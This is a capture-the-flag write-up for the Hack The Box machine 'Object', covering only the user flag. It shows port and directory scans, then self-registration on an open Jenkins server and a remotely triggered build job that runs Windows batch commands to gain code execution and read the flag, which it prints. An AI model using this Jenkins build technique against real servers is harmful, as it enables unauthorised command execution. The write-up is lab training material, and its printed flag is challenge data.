# Object Writeup - User

> Team: UMDCSEC <br />
> Author: artemis19
--------------------

## Enumeration

First, I ran an "all ports" scan on the host and then service enumeration with some default scripts on the ports listed as open.

```bash
nmap -Pn -p- -oN allports.txt 10.129.230.200
Nmap scan report for 10.129.230.200
Host is up (0.022s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
8080/tcp open  http-proxy
```

```bash
nmap -Pn -sC -sV -p80,5985,8080 -oN services.txt 10.129.230.200
Nmap scan report for 10.129.230.200
Host is up (0.029s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Mega Engines
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp open  http    Jetty 9.4.43.v20210629
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.43.v20210629)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

The initial site at http://10.129.230.200/ didn't seem to have much but makes a reference to its automaion server at http://object.htb:8080/. This didn't load initially, so I had it to my `/etc/hosts` file before I could load the site.

When I reloaded the I was redirected to http://object.htb:8080/login?from=%2F, which was a login to a Jenkins server.

I did some initial directory discovery to see what else might be on the web server.

```bash
gobuster dir -u http://object.htb:8080/ -w /opt/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -x txt,php,sh -b 403

/login                (Status: 200) [Size: 2120]
/signup               (Status: 200) [Size: 7937]
/assets               (Status: 302) [Size: 0] [--> http://object.htb:8080/assets/]
/logout               (Status: 302) [Size: 0] [--> http://object.htb:8080/]       
/robots.txt           (Status: 200) [Size: 71]                                    
/error                (Status: 400) [Size: 8340]                                  
/git                  (Status: 302) [Size: 0] [--> http://object.htb:8080/git/]   
/oops                 (Status: 200) [Size: 6552]
```

I navigated to http://object.htb:8080/robots.txt since that was one with a 200 HTTP response code, and it said:

```
# we don't want robots to click "build" links
User-agent: *
Disallow: /
```

## Jenkins Server - User.txt

This made me think that I could potentially build & run things on the Jenkins server... so I went to http://object.htb:8080/signup and registered an account. I then created a new "Freestyle project" called `test`.

I set the following Build configurations:
```
Build Triggers: "Trigger builds remotely (e.g., from scripts)" with the token set as "test"

Build: "Execute Windows batch command"
```

I chose `Windows batch command` because the initial scans indicated that the host was a Windows OS, and I saw the Jenkins server had a "built-in node" labeled as `Windows Server 2019 (amd64)` architecture.

I could then navigate to http://object.htb:8080/job/test/build?token=test to activate a build. I realized this would allow me to run any command on the Windows host, so I went back to my build setting and put `whoami` in the "Execute Windows batch command" box. I could then navigate to the individual builds and look at the "Console Output."

```
Started by remote host 10.10.14.104
Running as SYSTEM
Building in workspace C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\test
[test] $ cmd /c call C:\Users\oliver\AppData\Local\Temp\jenkins17637621465730238042.bat

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\test>whoami
object\oliver

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\test>exit 0 
Finished: SUCCESS
```

I saw that I was the `oliver` user which made me think I could just try to read the `user` flag out through a build. I then back to my Build Step and replaced `whoami` with the following batch command:

```
type C:\Users\oliver\Desktop\user.txt
```

I again navigated to http://object.htb:8080/job/test/build?token=test to initiate the build and then went to the "Console Output" of that build.

```
Started by remote host 10.10.14.104
Running as SYSTEM
Building in workspace C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\test
[test] $ cmd /c call C:\Users\oliver\AppData\Local\Temp\jenkins12053970599419404230.bat

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\test>type C:\Users\oliver\Desktop\user.txt 
HTB{c1_cd_c00k3d_up_1337!}

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\test>exit 0 
Finished: SUCCESS
```

`user.txt: HTB{c1_cd_c00k3d_up_1337!}`

Success!